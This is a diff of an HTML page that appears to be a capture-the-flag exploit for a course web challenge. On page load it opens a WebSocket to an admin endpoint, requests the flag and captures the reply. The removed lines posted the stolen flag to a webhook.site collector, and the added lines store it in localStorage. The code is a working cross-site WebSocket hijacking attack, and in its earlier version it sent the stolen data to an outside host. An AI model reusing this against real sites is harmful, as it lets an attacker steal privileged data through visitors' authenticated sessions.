@@ -3,84 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket and POST Request</title>
+    <title>Retrieve and Store Flag</title>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
-            const wsUrl = 'ws://hw2-3-web:8081/admin/ws';
-            const firstWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
-            const secondWebhookUrl = 'https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/';
+            const wsUrl = 'ws://ce441-web.spchallenge.ir:8080/admin/ws';
 
-            // Step 1: Send a POST request to the first webhook
-            console.log('Sending initial POST request...');
-            fetch(firstWebhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({ message: 'Initial POST request sent' }),
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Initial POST request sent successfully');
-                    
-                    // Step 2: Open WebSocket connection after the first POST is complete
-                    console.log('Opening WebSocket connection...');
-                    const ws = new WebSocket(wsUrl);
+            console.log('Opening WebSocket connection...');
+            const ws = new WebSocket(wsUrl);
 
-                    ws.onopen = () => {
-                        console.log('WebSocket connection opened');
-                        ws.send('flag'); // Request the flag
-                    };
+            ws.onopen = () => {
+                console.log('WebSocket connection opened');
+                ws.send('flag'); // Request the flag
+            };
 
-                    ws.onmessage = (event) => {
-                        console.log('Received WebSocket message:', event.data);
-                        if (event.data.includes('flag{')) {
-                            const flag = event.data;
-                            console.log('Flag received:', flag);
+            ws.onmessage = (event) => {
+                console.log('Received WebSocket message:', event.data);
+                if (event.data.includes('flag{')) {
+                    const flag = event.data;
+                    console.log('Flag received:', flag);
 
-                            // Step 3: Send the flag to the second webhook
-                            console.log('Sending flag to the second webhook...');
-                            fetch(secondWebhookUrl, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({ flag }),
-                            })
-                            .then(response => {
-                                if (response.ok) {
-                                    console.log('Flag sent successfully to the second webhook');
-                                } else {
-                                    console.error('Failed to send flag to the second webhook. Response status:', response.status);
-                                }
-                            })
-                            .catch(error => {
-                                console.error('Error sending flag to the second webhook:', error);
-                            });
-                        } else {
-                            console.warn('WebSocket message did not contain a flag:', event.data);
-                        }
-                    };
-
-                    ws.onerror = (error) => {
-                        console.error('WebSocket error:', error);
-                    };
-
-                    ws.onclose = () => {
-                        console.log('WebSocket connection closed');
-                    };
+                    // Store the flag in localStorage
+                    localStorage.setItem('capturedFlag', flag);
+                    console.log('Flag stored in localStorage');
                 } else {
-                    console.error('Failed to send the initial POST request. Response status:', response.status);
+                    console.warn('No valid flag found in the WebSocket message');
                 }
-            })
-            .catch(error => {
-                console.error('Error sending initial POST request:', error);
-            });
+            };
+
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+
+            ws.onclose = () => {
+                console.log('WebSocket connection closed');
+            };
         });
     </script>
 </head>
 <body>
-    <h1>WebSocket and POST Request</h1>
-    <p>The flag will be retrieved and sent automatically after the first POST request is completed.</p>
+    <h1>Retrieve and Store Flag</h1>
+    <p>The flag will be retrieved and stored in localStorage when the page loads. Check the console for details.</p>
 </body>
 </html>
